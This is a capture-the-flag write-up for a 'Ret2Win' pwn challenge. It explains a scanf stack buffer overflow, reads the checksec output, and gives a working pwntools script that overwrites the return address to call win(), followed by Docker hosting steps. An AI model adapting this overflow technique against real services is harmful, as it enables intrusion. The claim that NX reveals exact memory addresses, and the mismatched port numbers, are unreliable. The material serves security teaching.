# Ret2Win
Level - Medium

Description:
```
I'm just learning how to write C code, but getting input is tricky. 

nc byuctf.xyz 40002

[win]
```

## Writeup
I like to approach my pwn problems by defining three things - my purpose, the vulnerable code, and the roadblocks I have to overcome. My purpose is what I'm trying to do. Read a file? Run a function? Pop a shell? The vulnerable code is how I'm going to accomplish my purpose, like a buffer overflow, format strings vulnerability, or other technique. Lastly, I outline what potential roadblocks there may be in my way, security measures designed to prevent me from accomplishing my purpose.

### Purpose
My goal in this problem is to call the `win()` function - if you open the binary up in Ghidra, you can see that calling the `win()` function will print out the flag! However, this function isn't called in `main()` or `vulnerable()`, so we're going to have to access it some other way (* cough cough* *next part* * cough cough *).

### Vulnerable Code
Here is the decompilation of the `vulnerable()` function:

```c
void vulnerable(void) {
  undefined local_28 [32];
  
  printf("Enter your name: ");
  __isoc99_scanf(&DAT_0040201f,local_28);
  return;
}
```

We can see that this function calls `scanf()` with two parameters - whatever's stored inside of `&DAT_0040201f` (which, if you double click on it, is just `"%s"`), and `local_28`. This means it'll take a string as an input and store it into a buffer which Ghidra has named `local_28`. However, we can see that only 32 bytes have been allocated to this buffer - what if our string is longer?? This is where the buffer overflow occurs. I won't go into specifics on the memory model, but each time a function is called, the address for where to go *after* you're done running the function is stored on the stack. With a buffer overflow, you can overwrite that address so it can return wherever you want it to. What if we made it return to the `win()` function?

(*Extra reading - [How Buffer Overflows Work](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/)*)

### Roadblocks
There are four main roadblocks we check for when doing pwn problems - RELRO, stack canaries, NX enabled, and PIE enabled. If you install `pwntools` (which is a required Python dependency to run `solve.py`), you will be able to run the `checksec` command that will check for these things for you. Here is the output for the `win` binary:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

So we can see that the architecture is 64-bit, little-endian x86_64 (which is normal). RELRO is partial (good), there are no stack canaries (good), NX is enabled (bad, but okay for this problem), and PIE is disabled (good). Stack canaries are meant to prevent buffer overflows, but since there isn't one, we're cleared hot! Also, NX means that we know the exact memory address for this binary. This is perfect! Let's get to exploiting!

(*Extra reading - [PIE intro](https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html), [NX intro](https://guyinatuxedo.github.io/6.1-mitigation_nx/index.html), [Stack Canary intro](https://guyinatuxedo.github.io/7.1-mitigation_canary/index.html), [RELRO intro](https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html)*)

### Exploit
Okay, now we are ready to craft and test our exploit. I like to use `pwntools` ([install guide](https://pypi.org/project/pwntools/#installation)) since it makes exploiting easy. When debugging, I will typically output my payloads to a file called `exploit` and run it in GDB to watch the flow of commands and view register contents. My automated solve script will go into `solve.py`.

First, let me initialize it:
```python
from pwn import *

# initialize the binary
elf = context.binary = ELF("./win")

if args.REMOTE: # use python3 solve.py REMOTE
    p = remote("byuctf.xyz", 40000)
else:
    p = elf.process()
```

All you need to know here is that I'm importing the `pwntools` library, setting it up to use the `win` binary located in the same directory, and if I run it as `python3 solve.py REMOTE`, it will connect to the binary that the challenge creators are using through a connection like netcat. 

Next, we need to craft our payload. Since the buffer is 0x20 bytes long, then we need 0x20 bytes of garbage just to fill it up - everything after that will start to mess with values on the stack. We also need to send another 0x8 bytes of garbage since the old stack pointer from running `main()` is stored next. The values after that will determine where to go after returning from the function. So, I'm going to put 0x28 `a`s and the address of the `win()` function, `0x4011c9`:

```python
# craft payload
payload = b'a' * 0x28
payload += p64(0x4011c9)
```

Note how I added 0x28 `a`s as bytes instead of a string - this is how `pwntools` likes it! Also, I put `0x4011c9` into the `p64` function - this will do the hardwork of formatting it as a 64-bit little-endian string for us. You could also write `\xc9\x11\x40\x00\x00\x00\x00\x00`, but using the `p64` function is a lot easier!

How do I know the address for the `win()` function? Well, since PIE is disabled, we know where any part of the binary should be located in memory. I use Ghidra to see where the function is and just copy that memory address (you can also find it in GDB).

img

Now, all we have to do is send the payload and see what the program gives us!

```python
# get to input and send payload
p.recvline()
p.sendline(payload)

# get flag!
p.interactive()
```

Running it, we get the output:
```
[*] '/tmp/win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './win': pid 3966
[*] Switching to interactive mode
Enter your name: [*] Process './win' stopped with exit code -11 (SIGSEGV) (pid 3966)
Your flag is - byuctf{ret2win_really_is_a_win!}
[*] Got EOF while reading in interactive
$
[*] Interrupted
```

**Flag** - `byuctf{ret2win_really_is_a_win!}`

## Hosting
`win` was compiled with `gcc -o win win.c -no-pie`.

This challenge should be a Docker container that runs the executable `win` every time someone connects on port 40002. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
sudo docker build -t win .
```

The command to start the challenge is:

```bash
sudo docker run -p 40002:40000 --detach --name win win:latest
```

The command to stop the challenge (since CTRL+C won't work) is:

```bash
sudo docker stop win
```